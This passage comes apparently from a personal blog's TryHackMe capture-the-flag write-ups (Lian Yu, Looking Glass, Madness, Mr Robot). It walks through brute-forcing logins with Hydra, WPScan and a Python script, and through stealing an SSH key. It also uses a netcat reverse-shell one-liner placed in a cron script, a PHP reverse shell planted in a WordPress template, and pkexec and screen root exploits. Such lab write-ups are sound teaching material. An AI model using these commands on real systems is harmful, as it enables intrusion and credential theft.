base58. Trying that out, we get: !#th3****\nUsing the *****a**e and the !#th3**** as creds to ftp, we get in!\n1.4 FTP ┌──(kali㉿kali)-[/tmp] └─$ ftp 10.10.185.218 Connected to 10.10.185.218. 220 (vsFTPd 3.0.2) Name (10.10.185.218:kali): *****a**e 331 Please specify the password. Password: 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rw-r--r-- 1 0 0 511720 May 01 2020 Leave_me_alone.png -rw-r--r-- 1 0 0 549924 May 05 2020 Queen's_Gambit.png -rw-r--r-- 1 0 0 191026 May 01 2020 aa.jpg 226 Directory send OK. ftp\u0026gt; get Leave_me_alone.png ... ftp\u0026gt; get Queen's_Gambit.png ... ftp\u0026gt; get aa.jpg ... 1.5 File Exploration ┌──(kali㉿kali)-[/tmp] └─$ file Leave_me_alone.png Leave_me_alone.png: data ┌──(kali㉿kali)-[/tmp] └─$ steghide --extract --stegofile aa.jpg Enter passphrase: wrote extracted data to \u0026quot;ss.zip\u0026quot;. Trying empty string did not work, but password as password did. Quite common, plus, I\u0026rsquo;d like to dodge as many stego challenges :D\nAnyways, going in, we have two files\n┌──(kali㉿kali)-[/tmp] └─$ cat passwd.txt This is your visa to Land on Lian_Yu # Just for Fun *** a small Note about it Having spent years on the island, ****** learned how to be resourceful and set booby traps all over the island in the common event he ran into dangerous people. The island is also home to many animals, including pheasants, wild pigs and wolves. We get a username\n┌──(kali㉿kali)-[/tmp] └─$ cat shado ********* \u0026hellip; did not work on the user we saw.\nTracing our steps back, we may have missed something important: ls -la is always preferred over ls. I took note!\nHere\u0026rsquo;s the interesting file we missed:\n-rw-r--r-- 1 0 0 2483 May 01 2020 .other_user Looking in it, we get a whole bunch of other users, and we just try them one by one :D\nPS: You could use Hydra, but I feel that equal work.\n2. Foothold ┌──(kali㉿kali)-[~] └─$ ssh ****e@10.10.185.218 ****e@10.10.185.218's password: Way To SSH... Loading.........Done.. Connecting To Lian_Yu Happy Hacking ██╗ ██╗███████╗██╗ ██████╗ ██████╗ ███╗ ███╗███████╗██████╗ ██║ ██║██╔════╝██║ ██╔════╝██╔═══██╗████╗ ████║██╔════╝╚════██╗ ██║ █╗ ██║█████╗ ██║ ██║ ██║ ██║██╔████╔██║█████╗ █████╔╝ ██║███╗██║██╔══╝ ██║ ██║ ██║ ██║██║╚██╔╝██║██╔══╝ ██╔═══╝ ╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗███████╗ ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝ ╚═╝╚══════╝╚══════╝ ██╗ ██╗ █████╗ ███╗ ██╗ ██╗ ██╗██╗ ██╗ ██║ ██║██╔══██╗████╗ ██║ ╚██╗ ██╔╝██║ ██║ ██║ ██║███████║██╔██╗ ██║ ╚████╔╝ ██║ ██║ ██║ ██║██╔══██║██║╚██╗██║ ╚██╔╝ ██║ ██║ ███████╗██║██║ ██║██║ ╚████║███████╗██║ ╚██████╔╝ ╚══════╝╚═╝╚═╝ ╚═╝╚═╝ ╚═══╝╚══════╝╚═╝ ╚═════╝ # ****e@LianYu:~$ Get the user flag. Easy. Nothing else too interesting. Except - the sudo permissions.\n3. PrivEsc Looking it up on gtfobins we get sudo pkexec /bin/bash as the command to run. Ez\nAnd \u0026hellip;\n****e@LianYu:~$ sudo /usr/bin/pkexec /bin/bash root@LianYu:~# cat /root/root.txt Mission accomplished ... We are done!\n","date":"2021-06-15T00:00:00Z","image":"https://i.imgur.com/SBMvmJZ.jpg","permalink":"https://chaudhary1337.github.io/p/tryhackme-lian-yu-writeup/","title":"TryHackMe: Lian Yu Writeup"},{"content":"Play\n1. Recon nmap scan:\n❯ nmap -script=default -sV -A -T4 10.10.216.198 Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-27 23:58 EST Nmap scan report for 10.10.216.198 Host is up (0.23s latency). Not shown: 916 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 3f:15:19:70:35:fd:dd:0d:07:a0:50:a3:7d:fa:10:a0 (RSA) | 256 a8:67:5c:52:77:02:41:d7:90:e7:ed:32:d2:01:d9:65 (ECDSA) |_ 256 26:92:59:2d:5e:25:90:89:09:f5:e5:e0:33:81:77:6a (ED25519) 9000/tcp open ssh Dropbear sshd (protocol 2.0) | ssh-hostkey: |_ 2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA) 9001/tcp open ssh Dropbear sshd (protocol 2.0) | ssh-hostkey: |_ 2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA) 9002/tcp open ssh Dropbear sshd (protocol 2.0) | ssh-hostkey: |_ 2048 ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11 (RSA) 9003/tcp open ssh Dropbear sshd (protocol 2.0) This goes on for a while \u0026hellip; wtf?\nThe website does not show shit, so gobuster is useless. At first i thought this was some bug, but I took a look at the hint, and it made sense: O(log n) A looking glass is a mirror. It\u0026rsquo;s binary search to find the correct port! Let\u0026rsquo;s do ssh root@IP -p 9000 and move accordingly. Ah for the lowest its showing \u0026lsquo;Lower\u0026rsquo; and for the highest its showing \u0026lsquo;Higher\u0026rsquo;. Now the mirror part makes sense.\nLesgoo manual brute-forcing \u0026hellip; yaayyyyyyyy :D the best thing ever!\n❯ ssh root@10.10.216.198 -p 9220 Lower Connection to 10.10.216.198 closed. ❯ ssh root@10.10.216.198 -p 9290 Higher Connection to 10.10.216.198 closed. aiyoo wtf is this shit. No other port in between ;-; Finally I stumble upon the port. What a pain! Also that port isn\u0026rsquo;t shown for some reason hmmmmm\nSo we get:\nYou've found the real service. Solve the challenge to get access to the box Jabberwocky 'Mdes mgplmmz, cvs alv lsmtsn aowil Fqs ncix hrd rxtbmi bp bwl arul; Elw bpmtc pgzt alv uvvordcet, Egf bwl qffl vaewz ovxztiql. 'Fvphve ewl Jbfugzlvgb, ff woy! Ioe kepu bwhx sbai, tst jlbal vppa grmjl! Bplhrf xag Rjinlu imro, pud tlnp Bwl jintmofh Iaohxtachxta!' Oi tzdr hjw oqzehp jpvvd tc oaoh: Eqvv amdx ale xpuxpqx hwt oi jhbkhe-- Hv rfwmgl wl fp moi Tfbaun xkgm, Puh jmvsd lloimi bp bwvyxaa. Eno pz io yyhqho xyhbkhe wl sushf, Bwl Nruiirhdjk, xmmj mnlw fy mpaxt, Jani pjqumpzgn xhcdbgi xag bjskvr dsoo, Pud cykdttk ej ba gaxt! Vnf, xpq! Wcl, xnh! Hrd ewyovka cvs alihbkh Ewl vpvict qseux dine huidoxt-achgb! Al peqi pt eitf, ick azmo mtd wlae Lx ymca krebqpsxug cevm. 'Ick lrla xhzj zlbmg vpt Qesulvwzrr? Cpqx vw bf eifz, qy mthmjwa dwn! V jitinofh kaz! Gtntdvl! Ttspaj!' Wl ciskvttk me apw jzn. 'Awbw utqasmx, tuh tst zljxaa bdcij Wph gjgl aoh zkuqsi zg ale hpie; Bpe oqbzc nxyi tst iosszqdtz, Eew ale xdte semja dbxxkhfe. Jdbr tivtmi pw sxderpIoeKeudmgdstd Enter Secret: Apparently its using the vignere ciphers. Don\u0026rsquo;t ask me how I know this. I just know it, ok?\nbewareTheJabberwock is the last line!\nOnce we do that, we get:\nEnter Secret: \u0026lt;:D\u0026gt; jabberwock:WaxworksPreciousUnfastenedSorry 2. Foothold Let\u0026rsquo;s login using the ssh 22 port (default).\njabberwock@looking-glass:~$ ls poem.txt twasBrillig.sh user.txt jabberwock@looking-glass:~$ sudo -l Matching Defaults entries for jabberwock on looking-glass: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User jabberwock may run the following commands on looking-glass: (root) NOPASSWD: /sbin/reboot The poem.txt is the jabberwock poem we saw earlier. Now what?\njabberwock@looking-glass:/home$ ls alice humptydumpty jabberwock tryhackme tweedledee tweedledum Well \u0026hellip; this is going to be a pain :/\nSo one important thing to look at is crontab, when nothing else is leading anywhere. We get:\njabberwock@looking-glass:~$ cat /etc/crontab # /etc/crontab: system-wide crontab # Unlike any other crontab you don't have to run the `crontab' # command to install the new version when you edit this file # and files in /etc/cron.d. These files also have username fields, # that none of the other crontabs do. SHELL=/bin/sh PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin # m h dom mon dow user command 17 * * * * root cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.hourly 25 6 * * * root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.daily ) 47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.weekly ) 52 6 1 * * root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.monthly ) # @reboot tweedledum bash /home/jabberwock/twasBrillig.sh Now from sudo -l we saw we can reboot. Sweet! We can just put our things in twasBrillig.sh to get into tweedledum. What to put in? bash. That\u0026rsquo;s what I did. And that NOT what you should do.\ndo this instead echo \u0026quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc MY_IP 1234 \u0026gt;/tmp/f\u0026quot; \u0026gt; twasBrillig.sh, which puts this line in the twasBrilling.sh file.\nNow my dumbass just put in bash, without realising that the port (which we found initially) was resected at each reboot. great.\nDon\u0026rsquo;t screup here! I\u0026rsquo;m just hoping this works :/ Well. Fuck. 3rd time.\nNow that works :DDD. We first get a proper shell using python3 -c \u0026quot;import pty;pty.spawn('/bin/bash')\u0026quot;\ntweedledum@looking-glass:~$ sudo -l sudo -l Matching Defaults entries for tweedledum on looking-glass: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User tweedledum may run the following commands on looking-glass: (tweedledee) NOPASSWD: /bin/bash Not as much powerful of a user I see.\ntweedledum@looking-glass:~$ cat humptydumpty.txt cat humptydumpty.txt dcfff5eb40423f055a4cd0a8d7ed39ff6cb9816868f5766b4088b9e9906961b9 7692c3ad3540bb803c020b3aee66cd8887123234ea0c6e7143c0add73ff431ed 28391d3bc64ec15cbb090426b04aa6b7649c3cc85f11230bb0105e02d15e3624 b808e156d18d1cecdcc1456375f8cae994c36549a07c8c2315b473dd9d7f404f fa51fd49abf67705d6a35d18218c115ff5633aec1f9ebfdc9d5d4956416f57f6 b9776d7ddf459c9ad5b0e1d6ac61e27befb5e99fd62446677600d7cacef544d0 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8 7468652070617373776f7264206973207a797877767574737271706f6e6d6c6b This looks like a hash, so we can do a hash identification. However, I did not find anything special here. So, it may as well be a series of hashes?\nUsing this tool, yes it is!\nhell yeah!\nWe do not find anything here, other than some more random poetry.txt. What\u0026rsquo;s left is the user alice. So check out what we can view? Well nothing in the ~, but what abuot .ssh? Maybe we can get a RSA key?!\nhumptydumpty@looking-glass:/home/alice$ ls -la .ssh/id_rsa ls -la .ssh/id_rsa -rw------- 1 humptydumpty humptydumpty 1679 Jul 3 2020 .ssh/id_rsa humptydumpty@looking-glass:/home/alice$ cat .ssh/id_rsa cat .ssh/id_rsa -----BEGIN RSA PRIVATE KEY----- ..... -----END RSA PRIVATE KEY----- Nice. Very nice.\n❯ ssh alice@10.10.216.198 -i id.id @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @ WARNING: UNPROTECTED PRIVATE KEY FILE! @ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ Permissions 0644 for 'id.id' are too open. It is required that your private key files are NOT accessible by others. This private key will be ignored. Load key \u0026quot;id.id\u0026quot;: bad permissions alice@10.10.216.198's password: ❯ chmod 600 id.id ❯ ssh alice@10.10.216.198 -i id.id Last login: Fri Jul 3 02:42:13 2020 from 192.168.170.1 alice@looking-glass:~$ ls kitten.txt 3. Priv Esc So since we are in, with a stable connection, lets run linpeas.sh :D\nTransfer using: ❯ scp -i path/to/id path/to/linpeas.sh alice@BOX_ID:~\n[+] Sudo version [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version Sudo version 1.8.21p2 For setuid:\nFiles with capabilities: /usr/bin/mtr-packet = cap_net_raw+ep That did not work \u0026hellip; but something else did:\nalice@looking-glass:~$ cat /etc/sudoers.d/alice alice ssalg-gnikool = (root) NOPASSWD: /bin/bash alice@looking-glass:~$ sudo -h ssalg-gnikool /bin/bash sudo: unable to resolve host ssalg-gnikool root@looking-glass:~# ","date":"2021-06-15T00:00:00Z","image":"https://i.imgur.com/UsmIsXh.png","permalink":"https://chaudhary1337.github.io/p/tryhackme-looking-glass-writeup/","title":"TryHackMe: Looking Glass Writeup"},{"content":"Play\n1. Scanning \u0026amp; Enumeration We do the below scans in parallel.\n1.1. Port Scanning Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 ac:f9:85:10:52:65:6e:17:f5:1c:34:e7:d8:64:67:b1 (RSA) | 256 dd:8e:5a:ec:b1:95:cd:dc:4d:01:b3:fe:5f:4e:12:c1 (ECDSA) |_ 256 e9:ed:e3:eb:58:77:3b:00:5e:3a:f5:24:d8:58:34:8e (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Nothing extraordinary.\n1.2. Web Exploration  \u0026lt;div class=\u0026quot;main_page\u0026quot;\u0026gt; \u0026lt;div class=\u0026quot;page_header floating_element\u0026quot;\u0026gt; \u0026lt;img src=\u0026quot;thm.jpg\u0026quot; class=\u0026quot;floating_element\u0026quot;/\u0026gt; \u0026lt;!-- They will never find me--\u0026gt; In the homepage, which is a default ubuntu page, we see the thm.jpg image, that does not render out properly. We see it in the source code.\n1.3. Steganography Exploring the image using strings, binwalk and steghide does not return anything.\nAt this point, one thing CTF challenges often have is the change in the magic number of the file.\nThese magic numbers are used by the system to recognise which file it is. Using xxd --plain thm.jpg \u0026gt; wow.txt we see the first line: 89504e470d0a1a0a000000010100000100010000ffdb0043000302020302\nI looked up the actual values for jpg files. We thus change the first line to: ffd8ffe000104a46494600010100000100010000ffdb0043000302020302\nWe see the hidden directory mentioned in the image!\nPS: It is also a good idea to download the image \u0026hellip; just in case, you know?\n1.4. Hidden Directory Exploration Info gathered:\n We have to enter a secret Source code mentions something about the type of input and the size of input. The question is thus: How do we input?  1.5. Finding the Secret Trying the below gives us an expected response. Note how the parameter is accepted.\n┌──(kali㉿kali)-[/tmp] └─$ curl 10.10.0.237/{hidden_directory_name}/?secret=1 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Hidden Directory\u0026lt;/title\u0026gt; \u0026lt;link href=\u0026quot;stylesheet.css\u0026quot; rel=\u0026quot;stylesheet\u0026quot; type=\u0026quot;text/css\u0026quot;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026quot;main\u0026quot;\u0026gt; \u0026lt;h2\u0026gt;Welcome! I have been expecting you!\u0026lt;/h2\u0026gt; \u0026lt;p\u0026gt;To obtain my identity you need to guess my secret! \u0026lt;/p\u0026gt; \u0026lt;!-- It's between 0-99 but I don't think anyone will look here--\u0026gt; \u0026lt;p\u0026gt;Secret Entered: 1\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;That is wrong! Get outta here!\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; We also see the hint printed out here. Time for some scripting!\nI wrote the below code, which you can use to brute-forcing the value of the secret parameter.\n┌──(kali㉿kali)-[/tmp] └─$ cat script.py import requests url = \u0026quot;http://MACHINE_IP_HERE/{hidden_directory_name}/?secret=\u0026quot; for i in range(100): curr_url = url+str(i) response = requests.get(curr_url) if response.text.find(\u0026quot;wrong\u0026quot;) == -1: print(i) break print(f\u0026quot;Checking {i} rn\u0026quot;) And we get the secret number, which gets us a key!\nBut, to what?\n1.6. Steganography Remember the image we fixed earlier? Well, this is where the key is being used.\n┌──(kali㉿kali)-[/tmp] └─$ steghide --extract --stegofile download.jpeg Enter passphrase: wrote extracted data to \u0026quot;hidden.txt\u0026quot;. ┌──(kali㉿kali)-[/tmp] └─$ cat hidden.txt Fine you found the password! Here's a username wbxre I didn't say I would make it easy for you! Ey, Voila! Using rot13 gives us the username.\nBut \u0026hellip; PASSWORD????????\n2. Foothold (finally): Big Brain Time At this point, we have no active paths we could explore. Bruteforcing SSH is not a good idea. What to do?\nThis is very sneaky. Saw the image on the room? Download it.\n┌──(kali㉿kali)-[/tmp] └─$ steghide --extract --stegofile f***.jpg Enter passphrase: wrote extracted data to \u0026quot;password.txt\u0026quot;. ┌──(kali㉿kali)-[/tmp] └─$ cat password.txt I didn't think you'd find me! Congratulations! Here take my password {hidden} AH YES! Finally!\n3. PrivEsc We epxlore the common paths to priv esc.\njoker@ubuntu:~$ sudo -l [sudo] password for joker: Sorry, user joker may not run sudo on ubuntu. ^not useful.\njoker@ubuntu:~$ find / -type f -perm -u=s 2\u0026gt;/dev/null /usr/lib/openssh/ssh-keysign /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/eject/dmcrypt-get-device /usr/bin/vmware-user-suid-wrapper /usr/bin/gpasswd /usr/bin/passwd /usr/bin/newgrp /usr/bin/chsh /usr/bin/chfn /usr/bin/sudo /bin/fusermount /bin/su /bin/ping6 /bin/screen-4.5.0 /bin/screen-4.5.0.old /bin/mount /bin/ping /bin/umount ^finding set uid bit\nDoes something seem off to you? I googled it, and found the exploit.\nCopy-pasting the script and executing -\njoker@ubuntu:~$ vim wow.sh joker@ubuntu:~$ bash wow.sh wow.sh: line 1: creenroot.sh: command not found ~ gnu/screenroot ~ [+] First, we create our shell and library... /tmp/libhax.c: In function ‘dropshell’: /tmp/libhax.c:7:5: warning: implicit declaration of function ‘chmod’ [-Wimplicit-function-declaration] chmod(\u0026quot;/tmp/rootshell\u0026quot;, 04755); ^ /tmp/rootshell.c: In function ‘main’: /tmp/rootshell.c:3:5: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration] setuid(0); ^ /tmp/rootshell.c:4:5: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration] setgid(0); ^ /tmp/rootshell.c:5:5: warning: implicit declaration of function ‘seteuid’ [-Wimplicit-function-declaration] seteuid(0); ^ /tmp/rootshell.c:6:5: warning: implicit declaration of function ‘setegid’ [-Wimplicit-function-declaration] setegid(0); ^ /tmp/rootshell.c:7:5: warning: implicit declaration of function ‘execvp’ [-Wimplicit-function-declaration] execvp(\u0026quot;/bin/sh\u0026quot;, NULL, NULL); ^ [+] Now we create our /etc/ld.so.preload file... [+] Triggering... ' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored. [+] done! No Sockets found in /tmp/screens/S-joker. # whoami root System Compromised :)\nLESSONS LEARNT  For steganography challenges, look for: strings, binwalk, steghide and also magic numbers. Bruteforcing generic things is fun with python3 Stuck? Take a break and look where things are most \u0026hellip; normal. Google anything that looks shady.  ","date":"2021-06-15T00:00:00Z","image":"https://i.imgur.com/Ord2COL.png","permalink":"https://chaudhary1337.github.io/p/tryhackme-madness-writeup/","title":"TryHackMe: Madness Writeup"},{"content":"Play\n1. Recon 1.1 Port Scanning ❯ nmap -sC -sV -A -T4 10.10.91.137 Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-05 21:55 EST Nmap scan report for 10.10.91.137 Host is up (0.31s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 22/tcp closed ssh 80/tcp open http Apache httpd |_http-server-header: Apache |_http-title: Site doesn't have a title (text/html). 443/tcp open ssl/http Apache httpd |_http-server-header: Apache |_http-title: 400 Bad Request | ssl-cert: Subject: commonName=www.example.com | Not valid before: 2015-09-16T10:45:03 |_Not valid after: 2025-09-13T10:45:03 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 55.55 seconds 1.2 Web Enumeration ❯ gobuster dir -u 10.10.91.137 -w \u0026quot;/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt\u0026quot; -x \u0026quot;html,php,txt\u0026quot; =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.91.137 [+] Threads: 10 [+] Wordlist: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Extensions: html,php,txt [+] Timeout: 10s =============================================================== 2021/03/05 21:57:18 Starting gobuster =============================================================== /index.html (Status: 200) /index.php (Status: 301) /images (Status: 301) /blog (Status: 301) /sitemap (Status: 200) /rss (Status: 301) /login (Status: 302) /0 (Status: 301) /feed (Status: 301) /video (Status: 301) /image (Status: 301) /atom (Status: 301) /wp-content (Status: 301) /admin (Status: 301) /audio (Status: 301) /intro (Status: 200) /wp-login (Status: 200) /wp-login.php (Status: 200) /css (Status: 301) /rss2 (Status: 301) /license (Status: 200) /license.txt (Status: 200) /wp-includes (Status: 301) /js (Status: 301) /wp-register.php (Status: 301) /Image (Status: 301) /wp-rss2.php (Status: 301) /rdf (Status: 301) /page1 (Status: 301) /readme (Status: 200) /readme.html (Status: 200) /robots (Status: 200) /robots.txt (Status: 200) http://10.10.91.137/0/ shows a blog page. We also see the login option, redirecting us to /wp-login.php. No common creds work.\n1.3 Web Exploration Looking around more, we have /license.txt which has what you do just pull code from Rapid9 or some s@#% since when did you become a script kitty? lmao, and /readme showing: I like where you head is at. However I'm not going to help you.\nHowever, in /robots, I get: Makes sense for it to be in robots, since its about Mr robot XD. Going on this theme, we get fscoiety.dic which looks to be either usernames or passwords. On a whim, I decided to test the user Elliot on the /wp-login page. The password is obviously wrong, but renetering it for reset password, we see that its correct!\nFor obvious reasons, this fails, otherwise there would be no way to enter the box once the password is reset. Thus, we have the list, fscoiety.dic, which is password list!\nLet\u0026rsquo;s fireup hydra to start with the brute-forcing attack. But we need to know how to request is sent exactly. So, burpsuite time!\nPOST /wp-login.php HTTP/1.1 ... log=Elliot\u0026amp;pwd=Elliot\u0026amp;wp-submit=Log+In\u0026amp;redirect_to=http%3A%2F%2F10.10.91.137%2Fwp-admin%2F\u0026amp;testcookie=1 Okay. this is how it looks. Time for bruteforcing!\n1.4 Bruteforcing Use the command: ❯ hydra -l Elliot -P ../fsocity.dic 10.10.91.137 http-post-form \u0026quot;/wp-login.php:log=^USER^\u0026amp;pwd=^PWD^:The password you entered for the username\u0026quot;\nExplaination:\n hydra is the tool we use (smh) -l flag indicates only one username for (l)ogin. -L for a list of it -P flag for a password list. -p for a single password http-post-form is self explainatory. it requires 3 things, separated by :s  exact path to where you want to attack, in our case is /wp-login.php the syntax and style of username:password substring of the error message of wrong password (to thus differentiate between right and wrong)    Since this is brute-forcing, it\u0026rsquo;ll take time to execute. add -t flag to specify number of threads, default being 16.\nAt this point, I have to mention that I spent a long long time to make it work. It did not. One thing which I should have done the first was to remove duplicates. There\u0026rsquo;s also a tool called wpscan. Let\u0026rsquo;s try it out.\n1.5 WPScan ❯ wpscan --url 10.10.91.137 -t 64 -U Elliot -P ~/Desktop/Work/Pen-Testing/fsocity.dic _______________________________________________________________ __ _______ _____ \\ \\ / / __ \\ / ____| \\ \\ /\\ / /| |__) | (___ ___ __ _ _ __ ® \\ \\/ \\/ / | ___/ \\___ \\ / __|/ _` | '_ \\ \\ /\\ / | | ____) | (__| (_| | | | | \\/ \\/ |_| |_____/ \\___|\\__,_|_| |_| WordPress Security Scanner by the WPScan Team Version 3.8.12 @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart _______________________________________________________________ [i] Updating the Database ... [i] Update completed. [+] URL: http://10.10.91.137/ [10.10.91.137] [+] Started: Sat Mar 6 00:14:02 2021 Interesting Finding(s): [+] Headers | Interesting Entries: | - Server: Apache | - X-Mod-Pagespeed: 1.9.32.3-4523 | Found By: Headers (Passive Detection) | Confidence: 100% [+] robots.txt found: http://10.10.91.137/robots.txt | Found By: Robots Txt (Aggressive Detection) | Confidence: 100% [+] XML-RPC seems to be enabled: http://10.10.91.137/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: | - http://codex.cms.org/XML-RPC_Pingback_API | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/cms_ghost_scanner | - https://www.rapid7.com/db/modules/auxiliary/dos/http/cms_xmlrpc_dos | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/cms_xmlrpc_login | - https://www.rapid7.com/db/modules/auxiliary/scanner/http/cms_pingback_access [+] The external WP-Cron seems to be enabled: http://10.10.91.137/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: | - https://www.iplocation.net/defend-cms-from-ddos | - https://github.com/wpscanteam/wpscan/issues/1299 [+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15). | Found By: Emoji Settings (Passive Detection) | - http://10.10.91.137/47e29f4.html, Match: 'wp-includes\\/js\\/wp-emoji-release.min.js?ver=4.3.1' | Confirmed By: Meta Generator (Passive Detection) | - http://10.10.91.137/47e29f4.html, Match: 'WordPress 4.3.1' [+] WordPress theme in use: twentyfifteen | Location: http://10.10.91.137/wp-content/themes/twentyfifteen/ | Last Updated: 2020-12-09T00:00:00.000Z | Readme: http://10.10.91.137/wp-content/themes/twentyfifteen/readme.txt | [!] The version is out of date, the latest version is 2.8 | Style URL: http://10.10.91.137/wp-content/themes/twentyfifteen/style.css?ver=4.3.1 | Style Name: Twenty Fifteen | Style URI: https://cms.org/themes/twentyfifteen/ | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st... | Author: the WordPress team | Author URI: https://cms.org/ | | Found By: Css Style In 404 Page (Passive Detection) | | Version: 1.3 (80% confidence) | Found By: Style (Passive Detection) | - http://10.10.91.137/wp-content/themes/twentyfifteen/style.css?ver=4.3.1, Match: 'Version: 1.3' [+] Enumerating All Plugins (via Passive Methods) [i] No plugins Found. [+] Enumerating Config Backups (via Passive and Aggressive Methods) Checking Config Backups - Time: 00:00:03 \u0026lt;========================================================\u0026gt; (22 / 22) 100.00% Time: 00:00:03 [i] No Config Backups Found. [+] Performing password attack on Xmlrpc Multicall against 1 user/s [SUCCESS] - Elliot / {hmmmmmmmmmmmmmmmmmm} All Found Progress Time: 00:00:46 \u0026lt;====== \u0026gt; (2 / 22) 9.09% ETA: ??:??:?? [!] Valid Combinations Found: | Username: Elliot, Password: {hmmmmmmmmmmmmmmmmmm} [!] No WPScan API Token given, as a result vulnerability data has not been output. [!] You can get a free API token with 50 daily requests by registering at https://wpscan.com/register [+] Finished: Sat Mar 6 00:15:09 2021 [+] Requests Done: 73 [+] Cached Requests: 6 [+] Data Sent: 16.995 KB [+] Data Received: 16.491 MB [+] Memory used: 230.895 MB [+] Elapsed time: 00:01:06 I am very very impressed by the scanner. Not only did it find that /robots.txt file fairly quicky, it also gave us the password in a minute!\n2. Foothold To get a foothold, we need to figure what we can do with WordPress.\nWordPress 4.3.1 running Twenty Fifteen theme. I did not find issues with this version, that are direct in any way. What I found instead is to mess with the 404 page.\nin Appearace\u0026gt;Editor\u0026gt;404 Template, we get the template page for 404. Let\u0026rsquo;s put the php-reverse-shell.php file in there. Find this by using the locate command, or getting one from github.\nSave it, and have nc running. Now, go to a non-existent page like /haha.\n❯ nc -lnvp 1337 listening on [any] 1337 ... connect to [10.8.150.214] from (UNKNOWN) [10.10.91.137] 45401 Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux 05:27:10 up 2:34, 0 users, load average: 0.00, 0.17, 1.85 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=1(daemon) gid=1(daemon) groups=1(daemon) /bin/sh: 0: can't access tty; job control turned off $ we are in!\n===\nIn /home/robot,\n$ ls key-2-of-3.txt password.raw-md5 $ cat key-2-of-3.txt cat: key-2-of-3.txt: Permission denied very cute.\n3. Priv Esc Let\u0026rsquo;s first get a proper shell\n$ python3 --version Python 3.4.0 $ python3 -c \u0026quot;import pty; pty.spawn('/bin/bash')\u0026quot; daemon@linux:/home/robot$ daemon@linux:/home/robot$ cat password.raw-md5 cat password.raw-md5 robot:c3fcd3d76192e4007dfb496cca67e13b This looks fairly small, and no salt. Let\u0026rsquo;s use an online tool hashes.com\nAnd we have the creds! (also, very nice password XD)\ndaemon@linux:/home/robot$ su robot su robot Password: {hmmmmmmmmmmmmmmmmmm} robot@linux:~$ robot@linux:~$ sudo -l sudo -l [sudo] password for robot: {hmmmmmmmmmmmmmmmmmm} Sorry, user robot may not run sudo on linux. We can get the key 2 though! So priv esc to root time!\nI tried getting the linpeas.sh file from my machine, by setting up a httpserver, but that did not work. Only other way is to manually find issues.\nIf you have seen other priv-escs, all, or all I have seen, exploit something related to the set-uid bit.\nLet\u0026rsquo;s find the files having those, using: 